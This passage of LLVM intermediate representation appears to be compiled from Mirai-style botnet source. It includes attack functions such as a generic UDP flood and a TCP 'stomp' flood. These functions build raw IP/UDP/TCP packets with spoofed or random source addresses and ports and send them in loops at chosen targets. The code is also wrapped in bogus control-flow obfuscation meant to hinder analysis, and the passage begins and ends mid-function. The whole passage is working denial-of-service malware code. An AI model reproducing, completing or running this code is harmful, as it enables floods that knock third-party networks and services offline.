  %833 = bitcast %union.__CONST_SOCKADDR_ARG* %51 to %struct.sockaddr**
  %834 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %835 = load i32, i32* %17, align 4
  %836 = sext i32 %835 to i64
  %837 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %834, i64 %836
  %838 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %837, i32 0, i32 0
  %839 = bitcast %struct.sockaddr_in* %838 to %struct.sockaddr*
  store %struct.sockaddr* %839, %struct.sockaddr** %833, align 8
  %840 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %51, i32 0, i32 0
  %841 = load %struct.sockaddr*, %struct.sockaddr** %840, align 8
  %842 = call i64 @sendto(i32 %828, i8* %829, i64 %832, i32 16384, %struct.sockaddr* %841, i32 16)
  br label %843

; <label>:843:                                    ; preds = %771
  %844 = load i32, i32* %17, align 4
  %845 = add nsw i32 %844, 1
  store i32 %845, i32* %17, align 4
  br label %689

; <label>:846:                                    ; preds = %689
  br label %672

; <label>:847:                                    ; preds = %282, %143, %121
  %848 = load i32, i32* @x.31
  %849 = load i32, i32* @y.32
  %850 = sub i32 %848, 1
  %851 = mul i32 %848, %850
  %852 = urem i32 %851, 2
  %853 = icmp eq i32 %852, 0
  %854 = icmp slt i32 %849, 10
  %855 = or i1 %853, %854
  br i1 %855, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %847
  %856 = load i32, i32* @x.31
  %857 = load i32, i32* @y.32
  %858 = sub i32 %856, 1
  %859 = mul i32 %856, %858
  %860 = urem i32 %859, 2
  %861 = icmp eq i32 %860, 0
  %862 = icmp slt i32 %857, 10
  %863 = or i1 %861, %862
  br i1 %863, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %4
  %864 = alloca i8, align 1
  %865 = alloca %struct.attack_target*, align 8
  %866 = alloca i8, align 1
  %867 = alloca %struct.attack_option*, align 8
  %868 = alloca i32, align 4
  %869 = alloca i32, align 4
  %870 = alloca %struct.attack_stomp_data*, align 8
  %871 = alloca i8**, align 8
  %872 = alloca i8, align 1
  %873 = alloca i16, align 2
  %874 = alloca i8, align 1
  %875 = alloca i8, align 1
  %876 = alloca i16, align 2
  %877 = alloca i8, align 1
  %878 = alloca i8, align 1
  %879 = alloca i8, align 1
  %880 = alloca i8, align 1
  %881 = alloca i8, align 1
  %882 = alloca i8, align 1
  %883 = alloca i32, align 4
  %884 = alloca i8, align 1
  %885 = alloca i32, align 4
  %886 = alloca %struct.sockaddr_in, align 4
  %887 = alloca %struct.sockaddr_in, align 4
  %888 = alloca i32, align 4
  %889 = alloca [256 x i8], align 16
  %890 = alloca i64, align 8
  %891 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %892 = alloca i32, align 4
  %893 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %894 = alloca %struct.tcphdr*, align 8
  %895 = alloca %struct.iphdr*, align 8
  %896 = alloca %struct.tcphdr*, align 8
  %897 = alloca i8*, align 8
  %898 = alloca i8*, align 8
  %899 = alloca %struct.iphdr*, align 8
  %900 = alloca %struct.tcphdr*, align 8
  %901 = alloca i8*, align 8
  %902 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %864, align 1
  store %struct.attack_target* %1, %struct.attack_target** %865, align 8
  store i8 %2, i8* %866, align 1
  store %struct.attack_option* %3, %struct.attack_option** %867, align 8
  %903 = load i8, i8* %864, align 1
  %904 = zext i8 %903 to i64
  %905 = call noalias i8* @calloc(i64 %904, i64 16) #6
  %906 = bitcast i8* %905 to %struct.attack_stomp_data*
  store %struct.attack_stomp_data* %906, %struct.attack_stomp_data** %870, align 8
  %907 = load i8, i8* %864, align 1
  %908 = zext i8 %907 to i64
  %909 = call noalias i8* @calloc(i64 %908, i64 8) #6
  %910 = bitcast i8* %909 to i8**
  store i8** %910, i8*** %871, align 8
  %911 = load i8, i8* %866, align 1
  %912 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %913 = call i32 @attack_get_opt_int(i8 zeroext %911, %struct.attack_option* %912, i8 zeroext 2, i32 0)
  %914 = trunc i32 %913 to i8
  store i8 %914, i8* %872, align 1
  %915 = load i8, i8* %866, align 1
  %916 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %917 = call i32 @attack_get_opt_int(i8 zeroext %915, %struct.attack_option* %916, i8 zeroext 3, i32 65535)
  %918 = trunc i32 %917 to i16
  store i16 %918, i16* %873, align 2
  %919 = load i8, i8* %866, align 1
  %920 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %921 = call i32 @attack_get_opt_int(i8 zeroext %919, %struct.attack_option* %920, i8 zeroext 4, i32 64)
  %922 = trunc i32 %921 to i8
  store i8 %922, i8* %874, align 1
  %923 = load i8, i8* %866, align 1
  %924 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %925 = call i32 @attack_get_opt_int(i8 zeroext %923, %struct.attack_option* %924, i8 zeroext 5, i32 1)
  %926 = trunc i32 %925 to i8
  store i8 %926, i8* %875, align 1
  %927 = load i8, i8* %866, align 1
  %928 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %929 = call i32 @attack_get_opt_int(i8 zeroext %927, %struct.attack_option* %928, i8 zeroext 7, i32 65535)
  %930 = trunc i32 %929 to i16
  store i16 %930, i16* %876, align 2
  %931 = load i8, i8* %866, align 1
  %932 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %933 = call i32 @attack_get_opt_int(i8 zeroext %931, %struct.attack_option* %932, i8 zeroext 11, i32 1)
  %934 = trunc i32 %933 to i8
  store i8 %934, i8* %877, align 1
  %935 = load i8, i8* %866, align 1
  %936 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %937 = call i32 @attack_get_opt_int(i8 zeroext %935, %struct.attack_option* %936, i8 zeroext 12, i32 1)
  %938 = trunc i32 %937 to i8
  store i8 %938, i8* %878, align 1
  %939 = load i8, i8* %866, align 1
  %940 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %941 = call i32 @attack_get_opt_int(i8 zeroext %939, %struct.attack_option* %940, i8 zeroext 13, i32 1)
  %942 = trunc i32 %941 to i8
  store i8 %942, i8* %879, align 1
  %943 = load i8, i8* %866, align 1
  %944 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %945 = call i32 @attack_get_opt_int(i8 zeroext %943, %struct.attack_option* %944, i8 zeroext 14, i32 1)
  %946 = trunc i32 %945 to i8
  store i8 %946, i8* %880, align 1
  %947 = load i8, i8* %866, align 1
  %948 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %949 = call i32 @attack_get_opt_int(i8 zeroext %947, %struct.attack_option* %948, i8 zeroext 15, i32 1)
  %950 = trunc i32 %949 to i8
  store i8 %950, i8* %881, align 1
  %951 = load i8, i8* %866, align 1
  %952 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %953 = call i32 @attack_get_opt_int(i8 zeroext %951, %struct.attack_option* %952, i8 zeroext 16, i32 1)
  %954 = trunc i32 %953 to i8
  store i8 %954, i8* %882, align 1
  %955 = load i8, i8* %866, align 1
  %956 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %957 = call i32 @attack_get_opt_int(i8 zeroext %955, %struct.attack_option* %956, i8 zeroext 0, i32 768)
  store i32 %957, i32* %883, align 4
  %958 = load i8, i8* %866, align 1
  %959 = load %struct.attack_option*, %struct.attack_option** %867, align 8
  %960 = call i32 @attack_get_opt_int(i8 zeroext %958, %struct.attack_option* %959, i8 zeroext 1, i32 1)
  %961 = trunc i32 %960 to i8
  store i8 %961, i8* %884, align 1
  %962 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %962, i32* %869, align 4
  %963 = icmp eq i32 %962, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %122
  store i32 1, i32* %17, align 4
  %964 = load i32, i32* %18, align 4
  %965 = bitcast i32* %17 to i8*
  %966 = call i32 @setsockopt(i32 %964, i32 0, i32 3, i8* %965, i32 4) #6
  %967 = icmp eq i32 %966, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %152
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %222
  %968 = call i32 @rand_next()
  %_ = sub i32 %968, 65535
  %gen = mul i32 %_, 65535
  %969 = and i32 %968, 65535
  %970 = trunc i32 %969 to i16
  %971 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 1
  store i16 %970, i16* %971, align 2
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %247
  %972 = load i32, i32* %34, align 4
  %973 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %974 = bitcast %struct.sockaddr_in* %35 to %struct.sockaddr*
  store %struct.sockaddr* %974, %struct.sockaddr** %973, align 8
  %975 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %976 = load %struct.sockaddr*, %struct.sockaddr** %975, align 8
  %977 = call i32 @connect(i32 %972, %struct.sockaddr* %976, i32 16)
  %978 = call i64 @time(i64* null) #6
  store i64 %978, i64* %39, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %283
  %979 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %36, i32 0, i32 2
  %980 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %979, i32 0, i32 0
  %981 = load i32, i32* %980, align 4
  %982 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %35, i32 0, i32 2
  %983 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %982, i32 0, i32 0
  %984 = load i32, i32* %983, align 4
  %985 = icmp eq i32 %981, %984
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %572
  %986 = load i32, i32* %34, align 4
  %987 = call i32 @close(i32 %986)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %591
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %609
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %634
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %651
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %672
  store i32 0, i32* %17, align 4
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %711
  %988 = call i32 @rand_next()
  %_47 = sub i32 %988, 65535
  %gen48 = mul i32 %_47, 65535
  %_49 = shl i32 %988, 65535
  %_50 = shl i32 %988, 65535
  %_51 = sub i32 %988, 65535
  %gen52 = mul i32 %_51, 65535
  %_53 = sub i32 %988, 65535
  %gen54 = mul i32 %_53, 65535
  %_55 = shl i32 %988, 65535
  %_56 = shl i32 %988, 65535
  %989 = and i32 %988, 65535
  %990 = trunc i32 %989 to i16
  %991 = load %struct.iphdr*, %struct.iphdr** %48, align 8
  %992 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %991, i32 0, i32 3
  store i16 %990, i16* %992, align 4
  br label %originalBB46

originalBB60alteredBB:                            ; preds = %originalBB60, %733
  %993 = load i8, i8* %33, align 1
  %994 = icmp ne i8 %993, 0
  br label %originalBB60

originalBB64alteredBB:                            ; preds = %originalBB64, %752
  %995 = load i8*, i8** %50, align 8
  %996 = load i32, i32* %32, align 4
  call void @rand_str(i8* %995, i32 %996)
  br label %originalBB64

originalBB68alteredBB:                            ; preds = %originalBB68, %847
  br label %originalBB68
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpgeneric(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i32, align 4
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.udphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %28 = load i8, i8* %5, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #6
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %11, align 8
  %32 = load i8, i8* %7, align 1
  %33 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %34 = call i32 @attack_get_opt_int(i8 zeroext %32, %struct.attack_option* %33, i8 zeroext 2, i32 0)
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %12, align 1
  %36 = load i8, i8* %7, align 1
  %37 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = load i32, i32* @x.33
  %74 = load i32, i32* @y.34
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %72
  %81 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %81, i32* %10, align 4
  %82 = icmp eq i32 %81, -1
  %83 = load i32, i32* @x.33
  %84 = load i32, i32* @y.34
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %82, label %91, label %92

; <label>:91:                                     ; preds = %originalBBpart2
  br label %392

; <label>:92:                                     ; preds = %originalBBpart2
  store i32 1, i32* %9, align 4
  %93 = load i32, i32* %10, align 4
  %94 = bitcast i32* %9 to i8*
  %95 = call i32 @setsockopt(i32 %93, i32 0, i32 3, i8* %94, i32 4) #6
  %96 = icmp eq i32 %95, -1
  br i1 %96, label %97, label %116

; <label>:97:                                     ; preds = %92
  %98 = load i32, i32* @x.33
  %99 = load i32, i32* @y.34
  %100 = sub i32 %98, 1
  %101 = mul i32 %98, %100
  %102 = urem i32 %101, 2
  %103 = icmp eq i32 %102, 0
  %104 = icmp slt i32 %99, 10
  %105 = or i1 %103, %104
  br i1 %105, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %97
  %106 = load i32, i32* %10, align 4
  %107 = call i32 @close(i32 %106)
  %108 = load i32, i32* @x.33
  %109 = load i32, i32* @y.34
  %110 = sub i32 %108, 1
  %111 = mul i32 %108, %110
  %112 = urem i32 %111, 2
  %113 = icmp eq i32 %112, 0
  %114 = icmp slt i32 %109, 10
  %115 = or i1 %113, %114
  br i1 %115, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %392

; <label>:116:                                    ; preds = %92
  store i32 0, i32* %9, align 4
  br label %117

; <label>:117:                                    ; preds = %215, %116
  %118 = load i32, i32* %9, align 4
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = icmp slt i32 %118, %120
  br i1 %121, label %122, label %218

; <label>:122:                                    ; preds = %117
  %123 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %124 = load i8**, i8*** %11, align 8
  %125 = load i32, i32* %9, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds i8*, i8** %124, i64 %126
  store i8* %123, i8** %127, align 8
  %128 = load i8**, i8*** %11, align 8
  %129 = load i32, i32* %9, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds i8*, i8** %128, i64 %130
  %132 = load i8*, i8** %131, align 8
  %133 = bitcast i8* %132 to %struct.iphdr*
  store %struct.iphdr* %133, %struct.iphdr** %21, align 8
  %134 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %135 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %134, i64 1
  %136 = bitcast %struct.iphdr* %135 to %struct.udphdr*
  store %struct.udphdr* %136, %struct.udphdr** %22, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %138 = bitcast %struct.iphdr* %137 to i8*
  %139 = load i8, i8* %138, align 4
  %140 = and i8 %139, 15
  %141 = or i8 %140, 64
  store i8 %141, i8* %138, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %143 = bitcast %struct.iphdr* %142 to i8*
  %144 = load i8, i8* %143, align 4
  %145 = and i8 %144, -16
  %146 = or i8 %145, 5
  store i8 %146, i8* %143, align 4
  %147 = load i8, i8* %12, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 1
  store i8 %147, i8* %149, align 1
  %150 = load i16, i16* %18, align 2
  %151 = zext i16 %150 to i64
  %152 = add i64 28, %151
  %153 = trunc i64 %152 to i16
  %154 = call zeroext i16 @htons(i16 zeroext %153) #7
  %155 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %156 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %155, i32 0, i32 2
  store i16 %154, i16* %156, align 2
  %157 = load i16, i16* %13, align 2
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 3
  store i16 %158, i16* %160, align 4
  %161 = load i8, i8* %14, align 1
  %162 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 5
  store i8 %161, i8* %163, align 4
  %164 = load i8, i8* %15, align 1
  %165 = icmp ne i8 %164, 0
  br i1 %165, label %166, label %186

; <label>:166:                                    ; preds = %122
  %167 = load i32, i32* @x.33
  %168 = load i32, i32* @y.34
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %166
  %175 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %176 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 4
  store i16 %175, i16* %177, align 2
  %178 = load i32, i32* @x.33
  %179 = load i32, i32* @y.34
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %186

; <label>:186:                                    ; preds = %originalBBpart28, %122
  %187 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %188 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %187, i32 0, i32 6
  store i8 17, i8* %188, align 1
  %189 = load i32, i32* %20, align 4
  %190 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 8
  store i32 %189, i32* %191, align 4
  %192 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %193 = load i32, i32* %9, align 4
  %194 = sext i32 %193 to i64
  %195 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i64 %194
  %196 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %195, i32 0, i32 1
  %197 = load i32, i32* %196, align 4
  %198 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 9
  store i32 %197, i32* %199, align 4
  %200 = load i16, i16* %16, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %203 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %202, i32 0, i32 0
  store i16 %201, i16* %203, align 2
  %204 = load i16, i16* %17, align 2
  %205 = call zeroext i16 @htons(i16 zeroext %204) #7
  %206 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %207 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %206, i32 0, i32 1
  store i16 %205, i16* %207, align 2
  %208 = load i16, i16* %18, align 2
  %209 = zext i16 %208 to i64
  %210 = add i64 8, %209
  %211 = trunc i64 %210 to i16
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %214 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %213, i32 0, i32 2
  store i16 %212, i16* %214, align 2
  br label %215

; <label>:215:                                    ; preds = %186
  %216 = load i32, i32* %9, align 4
  %217 = add nsw i32 %216, 1
  store i32 %217, i32* %9, align 4
  br label %117

; <label>:218:                                    ; preds = %117
  br label %219

; <label>:219:                                    ; preds = %391, %218
  %220 = load i32, i32* @x.33
  %221 = load i32, i32* @y.34
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %219
  store i32 0, i32* %9, align 4
  %228 = load i32, i32* @x.33
  %229 = load i32, i32* @y.34
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %236

; <label>:236:                                    ; preds = %388, %originalBBpart212
  %237 = load i32, i32* %9, align 4
  %238 = load i8, i8* %5, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp slt i32 %237, %239
  br i1 %240, label %241, label %391

; <label>:241:                                    ; preds = %236
  %242 = load i8**, i8*** %11, align 8
  %243 = load i32, i32* %9, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds i8*, i8** %242, i64 %244
  %246 = load i8*, i8** %245, align 8
  store i8* %246, i8** %23, align 8
  %247 = load i8*, i8** %23, align 8
  %248 = bitcast i8* %247 to %struct.iphdr*
  store %struct.iphdr* %248, %struct.iphdr** %24, align 8
  %249 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %250 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %249, i64 1
  %251 = bitcast %struct.iphdr* %250 to %struct.udphdr*
  store %struct.udphdr* %251, %struct.udphdr** %25, align 8
  %252 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i64 1
  %254 = bitcast %struct.udphdr* %253 to i8*
  store i8* %254, i8** %26, align 8
  %255 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %256 = load i32, i32* %9, align 4
  %257 = sext i32 %256 to i64
  %258 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %255, i64 %257
  %259 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %258, i32 0, i32 2
  %260 = load i8, i8* %259, align 4
  %261 = zext i8 %260 to i32
  %262 = icmp slt i32 %261, 32
  br i1 %262, label %263, label %284

; <label>:263:                                    ; preds = %241
  %264 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %265 = load i32, i32* %9, align 4
  %266 = sext i32 %265 to i64
  %267 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %264, i64 %266
  %268 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %267, i32 0, i32 1
  %269 = load i32, i32* %268, align 4
  %270 = call i32 @ntohl(i32 %269) #7
  %271 = call i32 @rand_next()
  %272 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %273 = load i32, i32* %9, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %272, i64 %274
  %276 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %275, i32 0, i32 2
  %277 = load i8, i8* %276, align 4
  %278 = zext i8 %277 to i32
  %279 = lshr i32 %271, %278
  %280 = add i32 %270, %279
  %281 = call i32 @htonl(i32 %280) #7
  %282 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 9
  store i32 %281, i32* %283, align 4
  br label %284

; <label>:284:                                    ; preds = %263, %241
  %285 = load i32, i32* %20, align 4
  %286 = icmp eq i32 %285, -1
  br i1 %286, label %287, label %291

; <label>:287:                                    ; preds = %284
  %288 = call i32 @rand_next()
  %289 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %290 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %289, i32 0, i32 8
  store i32 %288, i32* %290, align 4
  br label %291

; <label>:291:                                    ; preds = %287, %284
  %292 = load i32, i32* @x.33
  %293 = load i32, i32* @y.34
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %291
  %300 = load i16, i16* %13, align 2
  %301 = zext i16 %300 to i32
  %302 = icmp eq i32 %301, 65535
  %303 = load i32, i32* @x.33
  %304 = load i32, i32* @y.34
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %302, label %311, label %316

; <label>:311:                                    ; preds = %originalBBpart216
  %312 = call i32 @rand_next()
  %313 = trunc i32 %312 to i16
  %314 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %315 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %314, i32 0, i32 3
  store i16 %313, i16* %315, align 4
  br label %316

; <label>:316:                                    ; preds = %311, %originalBBpart216
  %317 = load i16, i16* %16, align 2
  %318 = zext i16 %317 to i32
  %319 = icmp eq i32 %318, 65535
  br i1 %319, label %320, label %325

; <label>:320:                                    ; preds = %316
  %321 = call i32 @rand_next()
